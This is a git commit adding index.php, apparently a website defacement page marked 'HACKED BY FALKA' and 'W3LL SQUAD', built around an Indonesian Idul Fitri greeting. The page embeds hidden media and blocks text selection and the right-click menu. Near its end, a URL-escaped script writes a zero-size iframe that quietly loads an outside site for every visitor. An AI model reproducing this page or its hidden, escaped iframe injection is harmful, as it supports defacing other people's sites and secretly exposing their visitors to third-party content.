6bc0be92e1020862befbddb06475cd479477048b
falkagans <51378407+falkagans@users.noreply.github.com>
2019-06-04 23:51:41 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,73 @@
+<html>
+<head>
+<title> < Selamat Hari Raya Idul Fitri 1440H > </title>
+<object data="http://dc478.4shared.com/img/1250398008/2087d73b/dlink__2Fdownload_2FZzMWHSZ1_3Ftsid_3D20130809-014231-cf4a8620/preview.mp3" height="200" type="application/x-shockwave-flash" width="0"><param name="movie"><param name="bgcolor"><param name="FlashVars"></object>
+</head>
+<body>
+<body bgcolor="white">
+<font face='Lucida Sans Unicode' color='#000000' new size='2'><center>HACKED BY FALKA</center></font>
+</head>
+<body>
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/613007286/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
+<center>
+<center><img src="http://i1284.photobucket.com/albums/a578/rachmads404/banner_zpsc960dd1b.png">
+<body onload=writetext() onLoad="setTimeout('delayer()', 2000)" style="background-image: url('')">
+<p align=center></p>
+<SCRIPT language=JavaScript>
+msg = new Array(); //strings written in screen
+msg[0] = "<strong><font face='Lucida Sans Unicode' color='#000000' new size='4'><center><-> Selamat Hari Raya Idul Fitri 1440H <-></center></font></strong>";
+msg[1] = "<strong><font face='Lucida Sans Unicode' color='#000000' new size='2'><center>Taqabalallahu mina wa minkum..</center></font>";
+msg[2] = "<font face='Lucida Sans Unicode' color='#000000' new size='2'><center><br>Di hari yang Fitri ini, gw ingin minta maaf kepada kalian semua<br> mungkin selama ini gw berbuat salah kepada kalian, entah itu gw sengaja atau gk gw disengaja.</center></font>";
+msg[3] = "<font face='Lucida Sans Unicode' color='#000000' new size='2'><center>Karena manusia itu tidak sempurna, tidak luput dari kesalahan, <br> Maafin kesalahan gw ya :). <br> Kalo kalian punya salah dari dulu udah gw maafin kok :)</center></font>";
+msg[4] = "<font face='Lucida Sans Unicode' color='#000000' new size='2'><center><br>Mohon Maaf Lahir dan Batin.. :)<br><br><br>W3LL SQUAD OFFICIAL</center></font>";
+
+text1 = ""; //the same as text2, only the last character is highlighted
+text2 = ""; //current string, which will be written
+count = 0; //char index in string text
+count2 = 0; //number of strings
+text = msg[0].split(""); //text - string written
+function writetext() { //show strings above on screen
+text1 = text2 + "<font color='#FFFFFF'" + text[count] + "</font>";
+text2 += text[count];
+document.all["nothing"].innerHTML = text1; //where to write
+if (count < text.length-1){
+count++;
+setTimeout('writetext()', 35);
+}
+else { //if this string is written, get the new string
+count = 0;
+if (count2 != 15) { //write 15 strings
+count2++;
+text2 += ""; //a new line
+text = eval('msg['+count2+'].split("")'); //get the new string to text
+setTimeout('writetext()', 1);
+}
+}
+}
+</SCRIPT>
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Disable
+function disableselect(e){
+return false
+}
+function reEnable(){
+return true
+}
+//if IE4+
+document.onselectstart=new Function ("return false")
+document.oncontextmenu=new Function ("return false")
+//if NS6
+if (window.sidebar){document.onmousedown=disableselectdocument.onclick=reEnable}
+//-->
+</script>
+</script>
+<DIV id=nothing style="FONT-FAMILY: 'Courier'">
+<H2><U>
+</B></P><script>
+<!--
+document.write(unescape("%3Ciframe%20frameborder%3D%220%22%20height%3D%220%22%20src%3D%22http%3A//www.hvha.it%22%20%0A%0Awidth%3D%220%22%3E%3C/iframe%3E%0A%3Ca%20href%3D%22http%3A//www.hvha.it%22%20target%3D%22_blank%22%3E%3Cimg%20%0A%0Asrc%3D%22%22%20/%3E"));
+//-->
+</script>
+<P></P>
+</html>
+<body>
